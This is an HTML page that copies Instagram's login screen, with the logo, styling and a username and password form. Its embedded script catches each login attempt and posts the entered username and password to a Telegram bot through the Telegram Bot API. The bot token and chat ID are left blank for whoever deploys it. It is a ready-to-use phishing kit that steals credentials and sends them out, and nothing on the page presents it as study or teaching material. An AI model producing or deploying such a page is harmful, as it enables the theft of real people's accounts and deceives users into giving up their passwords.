<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            justify-content: space-between;
            align-items: center;
        }
        .phone-mockup {
            flex: 1;
            max-width: 454px;
            margin-right: 32px;
        }
        .phone-mockup img {
            width: 100%;
            height: auto;
            border-radius: 20px;
        }
        .login-form {
            flex: 0 0 350px;
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            text-align: center;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .logo {
            width: 120px;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 10px 8px;
            margin-bottom: 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 8px 0;
            margin: 10px 0 16px;
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.2s;
        }
        button:hover {
            background: #007ac0;
        }
        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 10px 0 18px;
        }
        .divider::before, .divider::after {
            content: '';
            flex-grow: 1;
            height: 1px;
            background: #dbdbdb;
            margin: 0 16px;
        }
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .signup {
            font-size: 14px;
            margin-top: 10px;
            color: #262626;
        }
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        @media (max-width: 875px) {
            .phone-mockup {
                display: none;
            }
            .container {
                justify-content: center;
                flex-direction: column;
                align-items: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-mockup">
            <img src="https://www.instagram.com/static/images/homepage/screenshot1.jpg" alt="Phone mockup">
        </div>
        <div class="login-form">
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
            <form id="loginForm" onsubmit="sendToTelegram(event)">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <div class="divider">OR</div>
            <a href="#" class="facebook-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
            <div class="signup">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
    </div>

    <script>
        const botToken = ""; // Replace with your full token
        const chatId = ""; // Replace with your full chat ID

        function sendToTelegram(event) {
            event.preventDefault(); // Prevent form submission

            const form = document.getElementById("loginForm");
            const formData = new FormData(form);
            const username = formData.get("username");
            const password = formData.get("password");
            const message = `Username: ${username}\nPassword: ${password}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                if (data.ok) {
                    console.log("Credentials sent to Telegram.");
                    alert("Credentials sent successfully!");
                    form.reset(); // Clear form
                } else {
                    throw new Error(data.description || "Unknown error");
                }
            })
            .catch(error => {
                console.error("Error:", error.message);
                alert("Failed to send credentials. Check console for details.");
            });
        }
    </script>
</body>
</html>
